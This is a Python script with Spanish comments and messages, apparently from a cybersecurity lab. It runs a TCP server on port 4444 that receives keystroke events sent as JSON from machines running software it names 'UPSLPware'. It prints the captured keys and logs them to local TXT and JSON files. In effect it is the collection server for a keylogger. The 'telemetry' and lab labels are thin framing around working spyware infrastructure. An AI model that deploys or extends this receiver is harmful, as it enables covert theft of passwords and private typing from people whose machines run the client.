
import os
import sys
import json
import socket
import threading
from datetime import datetime

HOST = "0.0.0.0"
PORT = 4444
ARCHIVO_LOG = "telemetria_recibida.json"
ARCHIVO_TXT = "telemetria_recibida.txt"

BANNER = """

         RECEPTOR DE TELEMETRÍA - KALI LINUX LAB                  
                                                                  
  Puerto: {port:<5}                                               
  Inicio: {inicio}                                          

"""

def inicializar_logs():
    encabezado = (
        
        "  RECEPTOR KALI - Telemetría Recibida\n"
        "  Laboratorio de Ciberseguridad\n"
        "  Inicio: {}\n"
        
    ).format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    if not os.path.exists(ARCHIVO_TXT):
        with open(ARCHIVO_TXT, 'w', encoding='utf-8') as f:
            f.write(encabezado)
            f.write("FECHA_RECEPCION     | ORIGEN              | EVENTOS | PRIMER_EVENTO\n")
            f.write("-" * 75 + "\n")

    if not os.path.exists(ARCHIVO_LOG):
        with open(ARCHIVO_LOG, 'w', encoding='utf-8') as f:
            json.dump({
                "paquetes": [],
                "metadata": {
                    "inicio": datetime.now().isoformat(),
                    "receptor": "Kali Linux",
                    "puerto": PORT
                }
            }, f, indent=2)


def guardar_paquete(data, addr):
    fecha_recepcion = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

    try:
        with open(ARCHIVO_TXT, 'a', encoding='utf-8') as f:
            origen = data.get("origen", "desconocido")
            cantidad = data.get("cantidad_eventos", 0)
            eventos = data.get("eventos", [])
            primer_evento = eventos[0]["fecha_hora"] if eventos else "N/A"

            linea = f"{fecha_recepcion} | {origen:<19} | {cantidad:>7} | {primer_evento}\n"
            f.write(linea)
    except Exception as e:
        print(f"[✗] Error al escribir TXT: {e}")

    try:
        with open(ARCHIVO_LOG, 'r', encoding='utf-8') as f:
            almacen = json.load(f)

        paquete = {
            "fecha_recepcion": fecha_recepcion,
            "ip_origen": addr[0],
            "puerto_origen": addr[1],
            "datos": data
        }

        almacen["paquetes"].append(paquete)
        almacen["metadata"]["ultima_recepcion"] = fecha_recepcion
        almacen["metadata"]["total_paquetes"] = len(almacen["paquetes"])

        with open(ARCHIVO_LOG, 'w', encoding='utf-8') as f:
            json.dump(almacen, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[✗] Error al escribir JSON: {e}")


def manejar_cliente(conn, addr):
    print(f"\n[+] Conexión establecida desde {addr[0]}:{addr[1]}")

    buffer = ""
    try:
        while True:
            datos = conn.recv(4096)
            if not datos:
                break

            buffer += datos.decode('utf-8')

            while "\n" in buffer:
                linea, buffer = buffer.split("\n", 1)
                if linea.strip():
                    try:
                        payload = json.loads(linea)
                        cantidad = payload.get("cantidad_eventos", 0)
                        origen = payload.get("origen", "desconocido")

                        print(f"[→] Recibidos {cantidad} eventos de '{origen}'")
                        guardar_paquete(payload, addr)

                        eventos = payload.get("eventos", [])
                        for ev in eventos[:3]:
                            print(f"    └─ {ev['fecha_hora']} | {ev['tipo']} | {ev['tecla']}")
                        if len(eventos) > 3:
                            print(f"    └─ ... y {len(eventos)-3} eventos más")

                    except json.JSONDecodeError:
                        print(f"[✗] Paquete malformado: {linea[:100]}")

    except Exception as e:
        print(f"[✗] Error en conexión con {addr}: {e}")
    finally:
        conn.close()
        print(f"[-] Conexión cerrada con {addr[0]}:{addr[1]}")


def iniciar_servidor():
    inicializar_logs()

    print(BANNER.format(port=PORT, inicio=datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        servidor.bind((HOST, PORT))
        servidor.listen(5)
        print(f"[*] Servidor escuchando en {HOST}:{PORT}")
        print("[*] Esperando conexiones de telemetría...\n")

        while True:
            conn, addr = servidor.accept()
            hilo = threading.Thread(target=manejar_cliente, args=(conn, addr))
            hilo.daemon = True
            hilo.start()

    except KeyboardInterrupt:
        print("\n[!] Servidor detenido por el usuario.")
    except Exception as e:
        print(f"[✗] Error del servidor: {e}")
    finally:
        servidor.close()
        print("[*] Servidor cerrado.")


if __name__ == "__main__":
    print("""
    
             RECEPTOR DE TELEMETRÍA - KALI LINUX                  
                                                                  
      Servidor para recepción de eventos de teclado              
      desde máquinas con UPSLPware instalado.                     
                                                                  
      Presiona Ctrl+C para detener el servidor.                  
    
    """)

    iniciar_servidor()
